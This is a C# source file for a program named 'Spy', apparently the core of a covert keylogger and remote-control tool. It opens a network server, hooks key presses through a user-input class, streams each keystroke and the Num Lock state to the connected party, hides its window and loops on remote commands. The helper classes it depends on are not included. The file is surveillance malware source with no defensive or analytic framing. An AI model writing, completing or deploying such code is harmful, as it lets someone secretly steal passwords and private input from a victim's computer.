using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using Both;

namespace Spy
{
    static class Program
    {
        static public Server server;
        static public Commends commends;
        static public UserAPI userAPI;
        static public int loopStep = 1000;

        static void Main(string[] args)
        {
            WriteLine("Spy Started...");
            string NameComputer = Net.NameComputer;
            Console.WriteLine("\t Name: " + NameComputer);
            Console.WriteLine("\t IP: " + Net.NameToIP(NameComputer));
            commends = new Commends();
            ByteArray.Length = Net.MaxByte;
            server = new Server(Net.Port, Net.MaxByte);
            commends.server = server;
            server.Read = commends.ReadServer;
            server.LoadChat = commends.LoadServer;
            SetToThread(server.Open);
            userAPI = new UserAPI();
            userAPI.ReadKeyShange(ReadKey);
            SetToThread(userAPI.ReadKeyStart);
            int CursorTop = Console.CursorTop;
            Console.CursorTop = 0;
            WriteLine("Spy Start     ");
            Console.CursorTop = CursorTop;
            Console.ReadKey();
            HideProgram.Look = false;
            while (true)
            {
                commends.Loop(false);
                Thread.Sleep(loopStep);
            }
        }

        //Read Key
        static public void ReadKey(Keys tv)
        {
            if (commends.ReadKeyNotReturn)
            {
                commends.ReadKeyNotReturn = false;
                return;
            }
            ByteArray byteArray = new ByteArray();
            byteArray.Write('K');
            byteArray.Write((int)tv);
            byteArray.Write((Console.NumberLock) ? 'T' : 'F');
            if (!commends.IsConnect)
                return;
            try
            {
                server.Write(byteArray.Values);
            }
            catch {}
        }

        //Other
        static public string WriteLine(string text)
        {
            TimeSpan time = DateTime.Now.TimeOfDay;
            time = new TimeSpan(time.Hours, time.Minutes, time.Seconds);
            string print = "[" + time + "]";
            print = print + " " + text;
            Console.WriteLine(print);
            return print;
        }
        static public Thread SetToThread(ThreadStart threadStart)
        {
            Thread set = new Thread(threadStart);
            set.Start();
            return set;
        }
        static public void Exit()
        {
            Application.ExitThread();
            Environment.Exit(Environment.ExitCode);
        }

        //Programin
        static void Next()
        {
            Console.Write("Next: ");
            Console.ReadKey();
        }
    }
}
